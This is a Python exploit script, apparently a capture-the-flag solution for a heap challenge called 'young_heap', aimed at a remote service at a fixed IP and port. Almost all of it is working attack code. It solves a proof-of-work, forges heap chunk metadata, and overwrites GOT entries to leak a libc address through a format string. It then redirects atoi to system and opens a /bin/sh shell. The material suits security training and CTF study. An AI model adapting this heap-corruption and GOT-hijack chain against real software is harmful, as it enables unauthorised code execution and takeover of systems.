#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import hashlib
import string
import itertools

bin_file = './young_heap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'47.89.11.82', 'port':10009})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_plt_printf     = binf.plt['printf']
addr_got_atoi       = binf.got['atoi']
addr_got_strlen     = binf.got['strlen']
addr_pool           = 0x6020c0

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_write   = libc.sep_function['write']

IN_USE = 0b01
IS_TOP = 0b10

#==========

def solve_pow(conn):
    conn.recvuntil('+')
    salt    = conn.recv(16)
    hashed  = conn.recvline().split()[-1]
    info('salt : ' + salt)
    info('hash : ' + hashed)

    chars = string.ascii_letters + string.digits
    for el in itertools.permutations(chars, 4):
        x = ''.join(el)
        if hashlib.sha256(x+salt).hexdigest() == hashed:
            info('solve xxxx : ' + x)
            conn.sendline(x)
            break

def attack(conn):
    yh = YoungHeap(conn)

    yh.malloc(0x10, 'a')                    # 0
    yh.malloc(0x20, 'b'*0x20)               # 1
    yh.malloc(0x10, 'c')                    # 2

    yh.edit(1, 'b'*0x20 + chr(0x50 | IN_USE))
    yh.free(0)
    yh.free(2)
    
    fake_chunk  = p64(0x20 | IN_USE)
    fake_chunk += p64(0x40)
    yh.malloc(0x20, 'A'*0x10 + fake_chunk)  # 0

    yh.free(1)
    fake_chunk  = p64(0x30 | IS_TOP)
    fake_chunk += p64(0x10)
    fake_chunk += p64(addr_pool + 3)
    yh.malloc(0x30, fake_chunk)             # 1

    fake_pool  = 'a'*5
    fake_pool += p64(addr_got_strlen)       # 3
    fake_pool += p64(addr_got_atoi)         # 4
    fake_pool += p64(addr_pool + 0x30)      # 5
    yh.malloc(0x100, fake_pool + '%3$p#')   # 2
    yh.edit(3, p64(addr_plt_printf)[:6])
    yh.edit(5, 'hoge')

    addr_libc_write  = int(conn.recvuntil('#', drop=True).split()[-1], 16) - 0x10
    libc.address = addr_libc_write - offset_libc_write
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    yh.edit(4, p64(addr_libc_system)[:6])
    conn.sendlineafter('>> ', '/bin/sh')

class YoungHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def malloc(self, size, content):
        self.sendlineafter('>> ', '1')
        self.sendlineafter('Size :', str(size))
        self.sendafter('Content :', content)

    def edit(self, idx, content):
        self.sendlineafter('>> ', '2 ')
        self.sendlineafter('heap :', str(idx).ljust(idx))
        self.sendafter('Content :', content)

    def free(self, idx):
        self.sendlineafter('>> ', '3  ')
        self.sendlineafter('heap :', str(idx).ljust(idx))

#==========

if __name__=='__main__':
    while True:
        try:
            conn = communicate(env.mode, **env.target)
            if env.check('remote'):
                solve_pow(conn)
            attack(conn)
            break
        except:
            conn.close()

        if env.check('debug'):
            break
    conn.interactive()
    
#==========
